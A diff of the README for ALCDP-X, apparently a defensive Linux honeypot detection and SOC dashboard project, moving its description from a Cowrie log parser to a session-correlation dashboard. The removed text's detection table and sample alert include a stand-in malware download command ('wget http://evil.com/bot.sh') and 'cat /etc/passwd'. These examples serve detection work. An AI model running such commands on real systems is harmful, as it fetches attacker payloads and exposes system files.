@@ -1,217 +1,165 @@
-# ALCDP‑X  
-### Autonomous Linux Compromise Detection & Response Platform
+🛡 ALCDP-X
 
-ALCDP‑X is a **blue‑team focused security platform** that detects, classifies, and responds to Linux system compromises using **honeypot telemetry, MITRE ATT&CK mapping, and automated alerting**.
+Autonomous Linux Cyber Defense Platform – Experimental SOC Engine
 
-This project is designed to simulate **real SOC detection pipelines**, not toy scripts.
+🚀 Current Phase: 7
 
----
+Live SOC dashboard with session correlation, incident generation, and simulated campaign engine.
 
-## 🚀 Core Objectives
+🔥 Overview
 
-- Parse real **Cowrie honeypot logs**
-- Detect attacker behavior from command input
-- Classify attacks using **MITRE ATT&CK**
-- Assign severity levels automatically
-- Trigger alerts for high‑risk activity
-- Lay the foundation for **autonomous response**
+ALCDP-X is a modular cybersecurity platform designed to simulate and analyze attacker behavior in a Linux environment.
 
----
+It includes:
 
-## 🧠 Architecture Overview
+Real-time event ingestion
 
-Cowrie Honeypot Logs
-↓
-Parser Engine (cowrie_parser.py)
-↓
-Detection Rules (rules.py)
-↓
-Alert Manager
-↓
-[ Future ] Automated Response (Firewall / Isolation)
+Session-based correlation
 
+Automated incident generation
 
----
+SOAR-style response simulation
 
-## 📁 Project Structure
+Live SOC dashboard (Chart.js + Flask)
 
-alcdp-x/
-├── alerts/
-│ └── alert_manager.py # Alert generation & logging
-├── detections/
-│ └── rules.py # Detection & MITRE mapping logic
-├── logs/
-│ └── cowrie.json # Cowrie honeypot logs
-├── parser/
-│ └── cowrie_parser.py # Core parsing engine
-├── reports/
-│ └── alerts.log # Alert records
-├── response/
-│ └── firewall.py # (Planned) Automated response
-├── state/
-│ ├── alert_cache.json
-│ └── blocked_ips.json
-└── README.md
+This is not a static dashboard.
+It models attacker behavior progression over time.
 
+🧠 Architecture
+Correlation Engine
+        ↓
+Event Store (In-Memory)
+        ↓
+Session Correlation Logic
+        ↓
+Incident Generation
+        ↓
+Flask API
+        ↓
+Live Dashboard (Auto-refresh)
 
----
+Single-process architecture ensures shared memory between engine and dashboard.
 
-## 🔍 Detection Logic
+📂 Project Structure
+ALCDP_X/
+│
+├── dashboard/
+│   ├── app.py
+│   ├── services/event_store.py
+│   ├── static/
+│   └── templates/
+│
+├── correlation/
+│   └── correlator.py
+│
+├── collectors/
+│   └── cowrie_tail.py (planned ingestion)
+│
+├── geoip/
+│
+└── detection/
+⚙️ Features Implemented (Phase 7)
+1️⃣ Event Generation
 
-ALCDP‑X uses **regex‑based behavioral detection** instead of static signatures.
+Simulated attacker campaigns
 
-### Example Detection Rules
+Command-based scoring logic
 
-| Attack Type | Command Example | Severity | MITRE |
-|------------|----------------|----------|-------|
-| Reconnaissance | `uname -a`, `whoami` | LOW | T1082 |
-| Malware Download | `wget http://evil.com/bot.sh` | CRITICAL | T1105 |
-| Privilege Escalation | `sudo -l`, `su root` | HIGH | T1548 |
-| File Enumeration | `cat /etc/passwd` | MEDIUM | T1083 |
+MITRE technique tagging
 
----
+2️⃣ Session Correlation
 
-## 🚨 Alerting System
+Tracks per-IP:
 
-Alerts are generated automatically for **HIGH** and **CRITICAL** severity events.
+First seen
 
-Example alert output:
+Last seen
 
-🚨 ALERT GENERATED 🚨
-Time : 2026-01-29T19:21:03Z
-SourceIP : 127.0.0.1
-Session : cffada91888a
-Command : wget http://evil.com/bot.sh
-Type : MALWARE_DOWNLOAD
-Severity : CRITICAL
-MITRE : T1105
+Event count
 
+Max risk
 
----
+Technique set
 
-## 🧪 How to Run
+Escalation states:
 
-### Prerequisites
-- Linux (tested on Kali)
-- Python 3.10+
-- Cowrie honeypot logs
+LOW
 
-### Run the Parser
-```bash
-cd alcdp-x
-python3 -m parser.cowrie_parser
-🛡️ Current Capabilities
-✅ Honeypot log parsing
-✅ MITRE ATT&CK mapping
-✅ Severity classification
-✅ Alert generation
-✅ Modular detection engine
+ESCALATING
 
-🔮 Planned Features
-Session‑based attack correlation
+HIGH
 
-Kill‑chain detection (Recon → Download → Priv‑Esc)
+3️⃣ Incident Engine
 
-Automated firewall blocking
+Automatic incident creation when:
 
-AI‑assisted anomaly detection
+Event count ≥ threshold
 
-Dashboard & reporting
+Risk ≥ threshold
 
-Multi‑honeypot support
+Unique incident IDs (INC-00001)
 
-🎯 Use Cases
-SOC training & simulation
+Prevents duplicate OPEN incidents
 
-Blue‑team skill development
+4️⃣ Live Dashboard
 
-Honeypot telemetry analysis
+Top Attackers Chart
 
-Cybersecurity research
+Risk Timeline Chart
 
-Resume‑grade security project
+Sessions Table
 
-⚠️ Disclaimer
-This project is intended for defensive security research and education only.
-Do NOT deploy on production systems without proper hardening and review.
+Incidents Table
+
+Auto-refresh every 2 seconds
+
+🖥 How To Run
+1. Activate Environment
+cd ALCDP_X
+source venv/bin/activate
+2. Start Dashboard (includes background engine)
+python -m dashboard.app
+
+Open browser:
+
+http://127.0.0.1:5000
+🛠 Tech Stack
+
+Python 3.11+
+
+Flask
+
+Chart.js
+
+GeoIP (optional)
+
+Modular correlation engine
+
+🧩 MITRE ATT&CK Techniques Modeled
+Technique	Description
+T1082	System Information Discovery
+T1083	File Discovery
+T1003	Credential Access
+T1105	Ingress Tool Transfer
+T1053	Scheduled Task
+T1021	Remote Services
+🎯 Next Roadmap (Phase 8)
+
+SQLite persistence layer
+
+Real Cowrie log ingestion
+
+Campaign classification engine
+
+MITRE heatmap visualization
+
+SOAR real system response hooks
+
+⚠ Disclaimer
+
+This project is for educational and defensive research purposes only.
 
 👤 Author
-Hrudyansh Kayastha
-Cybersecurity | Linux Defense | Blue Team
-GitHub: https://github.com/hrudyansh009
 
-⭐ Final Note
-ALCDP‑X is built to think like a defender, not just detect strings.
-This is a foundation for autonomous cyber defense — not a toy IDS.
-
-
---🔧 Running ALCDP‑X
-1️⃣ Manual Start (Recommended for Development)
-cd ~/alcdp-x
-python3 -m parser.cowrie_parser
-
-
-This will:
-
-Parse Cowrie logs
-
-Detect malicious commands
-
-Generate alerts
-
-Trigger autonomous response (IP blocking if enabled)
-
-2️⃣ One‑Command Startup Script
-
-Create and use the startup script:
-
-chmod +x start.sh
-./start.sh
-
-
-This starts the full ALCDP‑X detection pipeline in one command.
-
-3️⃣ Auto‑Start on System Boot (Production Mode)
-
-ALCDP‑X can run automatically on system startup using systemd.
-
-Create service:
-sudo nano /etc/systemd/system/alcdp-x.service
-
-[Unit]
-Description=ALCDP-X Autonomous Linux Compromise Detection
-After=network.target
-
-[Service]
-Type=simple
-User=kali
-WorkingDirectory=/home/kali/alcdp-x
-ExecStart=/usr/bin/python3 /home/kali/alcdp-x/parser/cowrie_parser.py
-Restart=on-failure
-
-[Install]
-WantedBy=multi-user.target
-
-Enable & start:
-sudo systemctl daemon-reload
-sudo systemctl enable alcdp-x
-sudo systemctl start alcdp-x
-
-Check status:
-sudo systemctl status alcdp-x
-
-4️⃣ Logs & Alerts
-
-Cowrie logs: logs/cowrie.json
-
-Alerts: reports/alerts.log
-
-Blocked IP state: state/blocked_ips.json
-
-⚠️ Important Notes
-
-Run Cowrie before starting ALCDP‑X
-
-Root privileges required for firewall actions
-
-Designed for defensive security research only
+Hrudyansh
+Cybersecurity & AI Systems Research
